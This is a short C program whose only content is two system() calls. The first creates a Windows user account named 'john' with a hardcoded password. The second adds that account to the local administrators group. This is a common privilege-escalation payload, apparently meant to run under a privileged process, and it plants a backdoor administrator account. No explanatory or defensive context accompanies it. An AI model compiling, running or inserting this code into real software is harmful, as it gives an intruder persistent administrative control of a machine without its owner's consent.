#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user john password123! /add");
  i = system ("net localgroup administrators john /add");
  
  return 0;
}
